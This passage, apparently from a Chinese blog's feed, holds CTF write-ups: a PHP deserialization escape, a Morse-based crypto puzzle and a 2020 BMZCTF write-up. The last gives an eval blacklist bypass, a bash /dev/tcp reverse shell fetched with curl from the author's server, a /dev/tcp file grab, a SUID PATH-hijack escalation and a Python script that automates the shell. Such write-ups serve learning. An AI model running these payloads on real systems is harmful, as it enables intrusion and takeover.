punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最终payload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>记得空格绕<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844"><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>由于变量覆盖，直接覆盖<code>pass_word</code>即可</p><p>payload：<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341"><h4 id="题目思考-1"><a href="#题目思考-1" class="headerlink" title="题目思考"></a>题目思考</h4><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong> </p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>经典的反序列化长度逃逸的题目了</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><p>题目描述</p><pre class="language-none"><code class="language-none">菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py菜鸡 9:37:02key1: Do you want a DaJiBei?菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">为什么运行结果里好好的3，也要写成大小写混乱的样子？</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？ 为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png"><p>最终提示hint5直接点明摩斯密码</p><p>题目原件</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>《关于我的老师看到直接气死过去怎么办》</p><p>根据题目描述，把<code>key1</code>替换为<code>Do you want a DaJiBei?</code></p><p>调整好格式跑一遍，得到<code>thrEE_means_3</code>，尝试各种单表加密均无果，根据hint4，对原始文件进行尝试还是无果，最后比赛快结束了，放出直接提示hint5，尝试将全篇小写转换为<code>.</code>，大写转换为<code>-</code>解密，发现摩斯密码表并不是固定位数，怕是要爆破排列组合，放弃了。</p><p>赛后出题人 @cheyenne 指点，本题摩斯密码统一采用五位一组，由总数为245位可得。</p><p>由于本人python正在自学水平一般，套用之前写过的一套C的替换程序</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ： 2021/1/24 13:58@Auth ： gyy@Blog ：http://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>浓浓的菜鸡味~，跑出结果</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>拿去解密得</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>看到ascii码<code> 102 108 97 103</code>立马起了反应，这是<code>flag</code>的ascii码，所以是每两个或三个组合成一个字符</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>最后得到flag：<code>flag&#123;SEVen_means_8&#125;</code></p><p>无限接近答案，但密码学爷爷太强了呜呜呜</p><hr><p>有些收获吧，如有问题希望大佬们斧正。2021一起学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021</title>
      <link href="article/2021/"/>
      <url>article/2021/</url>
      
        <content type="html"><![CDATA[<p>展望2021</p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020BMZctf-Writeup</title>
      <link href="article/bmzctf2020/"/>
      <url>article/bmzctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>随缘做了两道web</p><p>昵称：Err0r</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'echo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'preg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'server'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'chr'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'html'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'md5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'post'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'get'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'session'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ascii'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'eval'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'replace'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'exec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cookie'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'$'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'include'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'print'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'scan'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'system'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ini_'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'passthru'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'pcntl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'open'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'current'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'local'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'require'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，但肯定还有能用的，<code>&lt;、&gt;、&quot;</code>因为<code>htmlspecialchars</code>也是不能用的</p><p>往无参数RCE方向走发现不太可行，最后利用<code>base_convert</code>构造语句</p><p>把<code>system</code>由base36转为base10，利用<code>base_convert(2146934604002,10,36)</code>发现可以执行系统命令，于是想读取根目录flag发现<code>/</code>传不进去，于是继续<code>base_convert(16191,10,36)</code>，利用<code>chr</code>函数转换<code>/</code>，最终读取flag</p><p>payload：<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>主要考察反弹shell，提权</p><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'+'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&lt;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\>'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\~'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\^'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\@'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&amp;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\%'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\*'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\('</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\)'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\='</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\.'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\]'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#125;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#123;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match <span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行，<code>ip</code>经过blacklist过滤后exec执行，但是测着发现foreach会每次取一位然后来执行，执行多次，也就是说只要不含<code>b</code>就可以执行，这里可以直接执行，但限制了18个字符的长度限制发挥，尝试反弹shell，明显反弹shell第一个单词<code>bash</code>会被过滤，另寻方法。</p><p>首先就执行<code>find / -name fl*&gt;1</code>，执行后输出结果到文件1，结果发现根本就没有flag！</p><p>测试echo可写，于是准备写个一句话木马，结果发现写的.php不执行，应该是写了规则。</p><p>于是准备写个<code>.htaccess</code>，结果一写直接500内部服务报错。</p><p>老实弹shell吧。</p><p>想直接写<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>，结果发现<code>&amp;</code>写不进去，测试发现靶机可连外网，于是在自己服务器上写个名为1的文件，内容为<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>再在靶机写个文件<code>1d</code>，内容为<code>curl ip/1&gt;1</code></p><p>运行<code>sh 1d</code>，发现不行，估计没有执行权限，赋予，<code>chmod 777 1d</code>，靶机运行了curl命令，访问我的服务器下载了文件1，这样就成功写了反弹shell的命令</p><p>在我的服务器监听端口，<code>nc -lvp [port]</code></p><p>再给1赋予执行权限<code>chmod 777 1</code>，需要用bash执行，可是不可以含有<code>b</code>，于是利用<code>?</code>和<code>[a-c]</code>，即执行<code>/?in/[a-c]ash 1</code></p><p>我的服务器成功getshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023"><p>根目录下没有发现flag，也没有readflag，找也找不到flag，有个<code>start.sh</code>，读取一下看看</p><pre class="language-sh" data-language="sh"><code class="language-sh">www-data@2a4c1fe2f663:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;start.shcat &#x2F;start.sh#!&#x2F;bin&#x2F;bash chmod 755 index.phpgcc &#x2F;root&#x2F;demo.c -o lovemv love &#x2F;usr&#x2F;bin&#x2F;lovechmod u+s &#x2F;usr&#x2F;bin&#x2F;loverm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logrm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</code></pre><p>关键在这个<code>/user/bin/love</code></p><p>读出来看看，服务器开监听端口，靶机shell执行<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119"><p>成功拿到文件，拷下来反编译一下(web狗汗颜)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787"><p>结果就是系统执行个ps命令</p><p>结合find发现了的一点东西</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363"><p><code>/root</code>目录没有权限，也许可能考点就是提权了</p><p>这是一个具有SUID权限的程序，在tmp目录写个内容为<code>/bin/bash</code>的ps文件，添加进环境变量，这样执行程序调用ps命令会优先从这里执行，而这里是我们伪造的ps命令，然后相当于以高级权限执行了<code>/bin/bash</code>。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>成功提权，直接<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573"><p>理解了师傅之前说的，提权，才是开始。</p><p>是的，权限真香，这才刚刚开始</p><p>后面再研究吧</p><p>附上一键弹shell脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/26 20:36@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="总结"><a href="#总结" class="headerlink" 